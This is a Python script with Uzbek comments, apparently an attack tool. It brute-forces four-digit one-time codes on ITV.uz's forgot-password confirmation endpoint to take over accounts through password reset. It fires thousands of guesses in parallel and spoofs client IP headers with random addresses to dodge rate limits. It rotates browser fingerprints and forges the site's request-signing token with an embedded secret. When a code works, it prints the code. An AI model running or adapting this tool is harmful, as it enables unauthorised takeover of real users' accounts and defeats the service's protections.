import aiohttp
import asyncio
import argparse
import random
import time
import json
import sys
import hashlib
from urllib.parse import urlparse

# Consolega real-time chiqarish uchun
sys.stdout.reconfigure(line_buffering=True)

# ==================== USER-AGENT RO'YXATI ====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

LANGUAGES = [
    "en-US,en;q=0.9", "en-GB,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8",
    "uz-UZ,uz;q=0.9,ru;q=0.8", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8",
]

SEC_CH_UA_LIST = [
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="24"',
    '"Chromium";v="125", "Microsoft Edge";v="125", "Not-A.Brand";v="99"',
]


def tasodifiy_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


# Har bir ishga tushirishda bir marta yaratiladi (barcha so'rovlar uchun bir xil)
DEV_UID = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=21))


def tasodifiy_headers(url="", custom_headers=None):
    """Har bir so'rov uchun noyob headerlar"""
    ua = random.choice(USER_AGENTS)
    ip = tasodifiy_ip()

    # URL dan Origin va Referer ni avtomatik olish
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.hostname}" if parsed.hostname else "https://example.com"
    referer = f"{origin}/"

    # Hozirgi vaqt (millisekund)
    request_time = str(int(time.time() * 1000))

    # ITV.uz secure token generatsiya
    itv_secret = 'J:T<2?HSU6J.e#)Smw~hvANtk([(Uf_+62UtaGcvfkk3ZcK!]G9FV97:V4&cX{@ySdQ/>jZ7P{*_6`4{MgLPV}#gXD,U#B7'
    secure_token = hashlib.md5(f"{itv_secret}{url}{request_time}".encode()).hexdigest()

    headers = {
        "Content-Type": "application/json",
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Origin": origin,
        "Referer": referer,
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "CF-Connecting-IP": ip,
        "True-Client-IP": ip,
        "X-Client-IP": ip,
        # ITV.uz maxsus headerlar
        "x-itv-app-language": "uz",
        "x-itv-app-version": "1.52.1",
        "x-itv-dev-brand": "Chrome",
        "x-itv-dev-model": "148",
        "x-itv-dev-os": "Windows",
        "x-itv-dev-os-version": "10",
        "x-itv-dev-type": "web",
        "x-itv-dev-uid": DEV_UID,
        "x-itv-id": "null",
        "x-itv-request-time": request_time,
        "x-itv-secure-token": secure_token,
    }

    if "Chrome" in ua or "Edg" in ua:
        headers["Sec-CH-UA"] = random.choice(SEC_CH_UA_LIST)
        headers["Sec-CH-UA-Mobile"] = "?0" if "Mobile" not in ua else "?1"
        headers["Sec-CH-UA-Platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
        headers["Sec-Fetch-Dest"] = "empty"
        headers["Sec-Fetch-Mode"] = "cors"
        headers["Sec-Fetch-Site"] = "same-site"

    # Custom headerlarni ustiga qo'shish (agar berilsa)
    if custom_headers:
        headers.update({k: v for k, v in custom_headers.items() if v is not None})

    return headers


# ==================== HISOBLAGICH ====================
class Hisoblagich:
    def __init__(self):
        self.yuborildi = 0
        self.muvaffaq = 0
        self.xato_429 = 0
        self.timeout = 0
        self.xato = 0
        self.topildi = False
        self.topilgan_parol = None
        self.lock = asyncio.Lock()
        self.boshlash_vaqti = time.time()

    async def oshir(self, tur):
        async with self.lock:
            self.yuborildi += 1
            if tur == "429": self.xato_429 += 1
            elif tur == "timeout": self.timeout += 1
            elif tur == "xato": self.xato += 1
            return self.yuborildi

    def tezlik(self):
        o_vaqt = time.time() - self.boshlash_vaqti
        if o_vaqt == 0: return 0
        return self.yuborildi / o_vaqt


# ==================== ASINXRON SO'ROV ====================
async def bitta_sorov(session, url, body_data, otp_key, otp_code, jami, hisob, sem, custom_headers=None):
    """Bitta OTP kodni asinxron tekshirish"""

    if hisob.topildi:
        return None

    async with sem:  # Concurrency limitini saqlash
        if hisob.topildi:
            return None

        data = {**body_data, otp_key: otp_code}
        headers = tasodifiy_headers(url, custom_headers)

        try:
            async with session.post(url, json=data, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as javob:
                status = javob.status
                javob_matni = await javob.text()

                joriy = await hisob.oshir("ok")

                # TOPILDI
                if status == 200 and "token" in javob_matni:
                    hisob.topildi = True
                    hisob.topilgan_parol = otp_code
                    tez = hisob.tezlik()
                    print(f"\n  {'*'*60}", flush=True)
                    print(f"  *  OTP KOD TOPILDI!", flush=True)
                    print(f"  *", flush=True)
                    print(f"  *  Body     : {json.dumps(body_data)}", flush=True)
                    print(f"  *  OTP Code : {otp_code}", flush=True)
                    print(f"  *  Status   : {status}", flush=True)
                    print(f"  *  Urinish  : {joriy}/{jami}", flush=True)
                    print(f"  *  Tezlik   : {tez:.0f} so'rov/sek", flush=True)
                    print(f"  *  Vaqt     : {time.time() - hisob.boshlash_vaqti:.1f}s", flush=True)
                    print(f"  *", flush=True)
                    print(f"  *  Javob    : {javob_matni[:200]}", flush=True)
                    print(f"  {'*'*60}\n", flush=True)
                    return otp_code

                if status == 429:
                    joriy = await hisob.oshir("429")
                    await asyncio.sleep(random.uniform(0.5, 1.5))

                # Har bir so'rovni consolega chiqarish
                print(f"  [-] {joriy}/{jami} | OTP: {otp_code} | Status: {status} | body:{json.dumps(data)}, response: {javob_matni[:200]}", flush=True)

        except asyncio.TimeoutError:
            joriy = await hisob.oshir("timeout")
            print(f"  [T] {joriy}/{jami} | OTP: {otp_code} | TIMEOUT", flush=True)
        except aiohttp.ClientError as e:
            joriy = await hisob.oshir("xato")
            print(f"  [X] {joriy}/{jami} | OTP: {otp_code} | XATO: {e}", flush=True)
        except Exception as e:
            joriy = await hisob.oshir("xato")
            print(f"  [X] {joriy}/{jami} | OTP: {otp_code} | XATO: {e}", flush=True)

    return None


async def otp_bruteforce(url, body_data, otp_key, boshlanish, tugash, concurrency, custom_headers=None):
    """Asosiy asinxron bruteforce funksiyasi"""

    kodlar = [f"{i:04d}" for i in range(boshlanish, tugash + 1)]
    jami = len(kodlar)
    hisob = Hisoblagich()

    # Concurrency limiti (bir vaqtda nechta so'rov)
    sem = asyncio.Semaphore(concurrency)

    print(f"\n{'='*60}")
    print(f"  OTP BRUTEFORCE — ASYNC TURBO")
    print(f"{'='*60}")
    print(f"  URL         : {url}")
    print(f"  Body        : {json.dumps(body_data)}")
    print(f"  OTP kalit   : {otp_key}")
    print(f"  Diapazon    : {kodlar[0]} — {kodlar[-1]}")
    print(f"  Jami        : {jami} ta kod")
    print(f"  Concurrency : {concurrency} ta parallel")
    print(f"  Timeout     : 5s (tez fail)")
    print(f"  Rejim       : aiohttp async (turbo)")
    print(f"{'='*60}\n")

    # TCP connector — ko'p ulanishni boshqaradi
    connector = aiohttp.TCPConnector(
        limit=concurrency,       # Umumiy ulanish limiti
        limit_per_host=concurrency,  # Bitta hostga limit
        ttl_dns_cache=300,       # DNS keshni saqlash
        enable_cleanup_closed=True,
    )

    async with aiohttp.ClientSession(connector=connector) as session:
        # BARCHA kodlarni bir vaqtda ishga tushirish
        tasks = [
            bitta_sorov(session, url, body_data, otp_key, kod, jami, hisob, sem, custom_headers)
            for kod in kodlar
        ]

        # Natijalarni kutish
        results = await asyncio.gather(*tasks, return_exceptions=True)

    # Yakuniy statistika
    umumiy_vaqt = time.time() - hisob.boshlash_vaqti
    tez = hisob.yuborildi / umumiy_vaqt if umumiy_vaqt > 0 else 0

    print(f"\n{'='*60}")
    print(f"  YAKUNIY NATIJA")
    print(f"{'='*60}")
    print(f"  Yuborildi  : {hisob.yuborildi} ta")
    print(f"  Vaqt       : {umumiy_vaqt:.1f} soniya ({umumiy_vaqt/60:.1f} daqiqa)")
    print(f"  Tezlik     : {tez:.0f} so'rov/soniya")
    print(f"  429 xato   : {hisob.xato_429} ta")
    print(f"  Timeout    : {hisob.timeout} ta")
    if hisob.topilgan_parol:
        print(f"  TOPILDI    : {hisob.topilgan_parol}")
    else:
        print(f"  Topilmadi")
    print(f"{'='*60}\n")


def main():
    parser = argparse.ArgumentParser(
        description='OTP bruteforce — async turbo rejim (ITV.uz)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Misol:
  python otp_turbo.py -s abc123def456
  python otp_turbo.py -s abc123def456 -c 100
  python otp_turbo.py -s abc123def456 -b 1 -g 99999 -c 200
        """
    )

    parser.add_argument('-s', '--session-id', required=True, help='Session ID')
    parser.add_argument('-k', '--otp-key', default='code', help='OTP kod uchun kalit nomi (standart: code)')
    parser.add_argument('-u', '--url', default='https://auth.itv.uz/api/v2/auth/forgot-password/confirm-code', help='API URL')
    parser.add_argument('-b', '--boshlanish', type=int, default=1, help='Boshlang\'ich kod (standart: 1)')
    parser.add_argument('-g', '--tugash', type=int, default=10000, help='Oxirgi kod (standart: 10000)')
    parser.add_argument('-c', '--concurrency', type=int, default=50, help='Bir vaqtda nechta so\'rov (standart: 50)')

    args = parser.parse_args()

    otp_key = args.otp_key or "code"
    body_data = {"sessionId": args.session_id}

    asyncio.run(otp_bruteforce(args.url, body_data, otp_key, args.boshlanish, args.tugash, args.concurrency))


if __name__ == '__main__':
    main()

